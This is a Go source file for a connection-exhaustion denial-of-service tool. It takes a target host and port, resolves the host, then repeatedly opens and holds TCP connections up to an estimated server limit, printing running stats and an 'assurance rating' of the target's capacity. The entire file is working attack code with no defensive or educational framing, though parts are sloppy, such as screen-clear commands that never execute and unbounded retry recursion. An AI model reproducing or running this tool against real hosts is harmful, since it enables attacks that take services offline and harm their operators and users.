package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

var hostAddress string
var aRecordCount int
var host string
var port int
var samplingCount = 0
var delay = 5000
var assuranceConsiderationTally = 1
var openConnectionsChangedTally = 0
var openConnections = map[int]net.Conn{}
var failedConnections = 0
var totalConnectAttempts = 0
var assuranceScore = 0.0
var maxConnections = 1000
var pendingConnections = 0
var prevPendingConnections = 0
var connectionTimeout = 5000
var idGenerator = 0
var hostResolved = false

func handleError(err error) {
	if err == nil {
		return
	}
	log.Println(err.Error())
}

var startTime time.Time

func main() {
	startTime = time.Now()
	flag.StringVar(&host, "host", "localhost", "Host to attack")
	flag.IntVar(&port, "port", 80, "Port to attack")
	flag.IntVar(&delay, "delay", 50, "Delay period")
	flag.IntVar(&maxConnections, "estimate", 1000, "Estimated server bandwidth")
	flag.Parse()
	killChannel := make(chan os.Signal, 1)
	fmt.Printf("Resolving %s\n", host)
	addresses, err := net.LookupHost(host)
	if len(addresses) == 0 || err != nil {
		panic(fmt.Errorf("Could not resolve %s\n", host))
	}
	hostResolved = true
	hostAddress = addresses[rand.Intn(len(addresses))]
	aRecordCount = len(addresses)
	defer close(killChannel)
	signal.Notify(killChannel, syscall.SIGTERM, syscall.SIGINT)
	go start(killChannel)
	go logStats(killChannel)
	sig := <-killChannel
	fmt.Printf("Closing due to: %v", sig)
}

func logStats(killChannel chan os.Signal) {
	var end = false
	go func() {
		<-killChannel
		end = true
	}()

	for {
		if end {
			break
		}
		time.Sleep(time.Duration(delay) * time.Second)
		pendingConnections = maxConnections - len(openConnections)
		if pendingConnections != prevPendingConnections {
			prevPendingConnections = pendingConnections
			openConnectionsChangedTally++
		} else {
			assuranceConsiderationTally++
		}
		samplingCount++
		assuranceScore = (float64(assuranceConsiderationTally)) / (float64(samplingCount) + float64(openConnectionsChangedTally))
		renderStats()

	}
}

func renderStats() {
	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/c", "cls")
	} else {
		exec.Command("clear")
	}
	fmt.Println("===========")
	fmt.Println("===STATS===")
	fmt.Println("===========")
	d := time.Since(startTime)
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	fmt.Printf("Time taken: %02dh:%02dm\n", h, m)
	fmt.Printf("Host: %s\n", host)
	fmt.Printf("IP: %s\n", hostAddress)
	fmt.Printf("Port: %d\n", port)
	fmt.Printf("# of DNS A records after lookup: %d\n", aRecordCount)
	fmt.Println("===========")
	fmt.Printf("Sample count: %d\n", samplingCount)
	fmt.Printf("Open Connections: %d\n", len(openConnections))
	fmt.Printf("Pending Connections: %d\n", pendingConnections)
	fmt.Printf("Failed Connections: %d\n", failedConnections)
	fmt.Printf("Total Connection attempts: %d\n", totalConnectAttempts)
	fmt.Printf("Estimated Server bandwidth: %d. Assurance rating: %.2f%%\n", maxConnections, assuranceScore*100)
}

func generateId() int {
	defer func() {
		idGenerator++
	}()
	return idGenerator
}

func start(killChannel chan os.Signal) {
	var end = false
	go func() {
		<-killChannel
		end = true
	}()

	for {
		if end {
			break
		}
		if pendingConnections <= 0 {
			continue
		}
		time.Sleep(time.Duration(delay) * time.Microsecond)
		if !hostResolved {
			fmt.Printf("Waiting for '%s' to be resolved...", host)
			continue
		}
		ptr := createConnection()
		if ptr == nil {
			failedConnections++
			continue
		}
		conn := *ptr
		id := generateId()
		if _, err := conn.Read(make([]byte, 1)); err == io.EOF {
			_ = conn.Close()
			delete(openConnections, id)
		}
		openConnections[id] = conn

	}
}

func createConnection() *net.Conn {
	totalConnectAttempts++
	conn, err := net.Dial("tcp4", net.JoinHostPort(hostAddress, fmt.Sprintf("%d", port)))
	if err != nil {
		failedConnections++
		handleError(err)
		if !strings.Contains(err.Error(), "connectex") {
			handleError(err)
		}
		return createConnection()
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(connectionTimeout)))
	err = conn.SetWriteDeadline(time.Now().Add(time.Duration(connectionTimeout)))
	return &conn
}
